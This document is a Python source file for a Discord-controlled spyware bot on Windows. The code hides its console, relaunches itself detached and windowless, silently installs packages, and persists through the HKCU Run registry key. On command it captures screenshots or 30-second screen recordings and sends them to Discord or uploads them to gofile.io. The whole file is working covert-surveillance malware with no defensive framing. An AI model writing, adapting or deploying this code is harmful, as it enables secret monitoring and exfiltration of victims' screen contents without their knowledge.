import os
import sys
import subprocess
import importlib
import time
import ctypes

# ==================== CONFIG ====================
DISCORD_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
# ================================================

# ---------- HIDE CONSOLE WINDOW (Windows) ----------
def hide_console():
    if os.name != "nt":
        return
    try:
        # Get handle to current console window
        kernel32 = ctypes.WinDLL("kernel32")
        user32 = ctypes.WinDLL("user32")
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            # SW_HIDE = 0
            user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

# ---------- RELAUNCH SELF WITH PYTHONW IF RUNNING WITH CONSOLE ----------
def relaunch_silently():
    """If launched with python.exe (console), relaunch with pythonw.exe and exit."""
    if os.name != "nt":
        return False

    # Already running under pythonw? Skip.
    exe = os.path.basename(sys.executable).lower()
    if exe == "pythonw.exe":
        return False

    # Avoid infinite relaunch loop
    if os.environ.get("_BOT_RELAUNCHED") == "1":
        return False

    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    if not os.path.exists(pythonw):
        return False

    env = os.environ.copy()
    env["_BOT_RELAUNCHED"] = "1"

    # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
    DETACHED_PROCESS = 0x00000008
    CREATE_NEW_PROCESS_GROUP = 0x00000200
    CREATE_NO_WINDOW = 0x08000000
    flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW

    subprocess.Popen(
        [pythonw, os.path.abspath(__file__)],
        env=env,
        creationflags=flags,
        close_fds=True,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return True

# Hide any existing console immediately
hide_console()

# If we were started with python.exe, relaunch silently and quit this one
if relaunch_silently():
    sys.exit(0)

# ---------- AUTO INSTALL DEPENDENCIES ----------
REQUIRED_PACKAGES = {
    "discord": "discord.py",
    "PIL": "Pillow",
    "mss": "mss",
    "numpy": "numpy",
    "requests": "requests",
    "cv2": "opencv-python",
}

def ensure_packages():
    for mod, pkg in REQUIRED_PACKAGES.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--quiet", pkg],
                creationflags=(0x08000000 if os.name == "nt" else 0),  # CREATE_NO_WINDOW
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

ensure_packages()

# ---------- NOW SAFE TO IMPORT ----------
import discord
from discord.ext import commands
import mss
import numpy as np
import requests
import cv2
import tempfile
from PIL import Image

# ---------- AUTOSTART SETUP (Windows) ----------
def setup_autostart():
    if os.name != "nt":
        return

    try:
        import winreg
        script_path = os.path.abspath(__file__)

        python_exe = sys.executable
        pythonw = os.path.join(os.path.dirname(python_exe), "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = python_exe

        # pythonw.exe already produces no window, but pass -u flag not needed;
        # we launch via pythonw so it's silent. Add "start /b" fallback if needed.
        cmd = f'"{pythonw}" "{script_path}"'

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "DiscordPCBot", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
    except Exception:
        pass

setup_autostart()

# ---------- BOT SETUP ----------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=",", intents=intents)

# ---------- HELPER: take screenshot ----------
def take_screenshot(path: str):
    with mss.mss() as sct:
        monitor = sct.monitors[0]
        shot = sct.grab(monitor)
        img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
        img.save(path, "PNG")

# ---------- HELPER: record screen 30s @ 60fps ----------
def record_screen(path: str, duration=30, fps=60):
    with mss.mss() as sct:
        monitor = sct.monitors[0]
        width = monitor["width"]
        height = monitor["height"]

        width -= width % 2
        height -= height % 2

        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(path, fourcc, fps, (width, height))

        frame_interval = 1.0 / fps
        end_time = time.time() + duration

        while time.time() < end_time:
            loop_start = time.time()
            shot = sct.grab(monitor)
            frame = np.array(shot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            frame = frame[:height, :width]
            out.write(frame)

            elapsed = time.time() - loop_start
            sleep_for = frame_interval - elapsed
            if sleep_for > 0:
                time.sleep(sleep_for)

        out.release()

# ---------- HELPER: upload to gofile ----------
def upload_to_gofile(filepath: str) -> str:
    r = requests.get("https://api.gofile.io/servers", timeout=15)
    r.raise_for_status()
    server = r.json()["data"]["servers"][0]["name"]

    url = f"https://{server}.gofile.io/contents/uploadfile"
    with open(filepath, "rb") as f:
        files = {"file": (os.path.basename(filepath), f)}
        resp = requests.post(url, files=files, timeout=120)
    resp.raise_for_status()
    data = resp.json()
    return data["data"]["downloadPage"]

# ---------- COMMANDS ----------
@bot.event
async def on_ready():
    pass  # silent

@bot.command(name="screenshot")
async def screenshot_cmd(ctx):
    await ctx.message.add_reaction("⏳")
    tmp = os.path.join(tempfile.gettempdir(), f"shot_{int(time.time())}.png")
    try:
        take_screenshot(tmp)
        await ctx.send(file=discord.File(tmp))
        await ctx.message.remove_reaction("⏳", bot.user)
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Screenshot failed: `{e}`")
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass

@bot.command(name="video")
async def video_cmd(ctx):
    await ctx.message.add_reaction("⏳")
    await ctx.send("🎥 Recording 30 seconds at 60 FPS...")

    tmp = os.path.join(tempfile.gettempdir(), f"rec_{int(time.time())}.mp4")
    try:
        await bot.loop.run_in_executor(None, record_screen, tmp)

        await ctx.send("☁️ Uploading to gofile.io...")
        link = await bot.loop.run_in_executor(None, upload_to_gofile, tmp)
        await ctx.send(f"✅ **Recording ready:** {link}")
        await ctx.message.remove_reaction("⏳", bot.user)
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Recording failed: `{e}`")
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass

# ---------- RUN ----------
if __name__ == "__main__":
    if DISCORD_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        sys.exit(1)
    bot.run(DISCORD_BOT_TOKEN)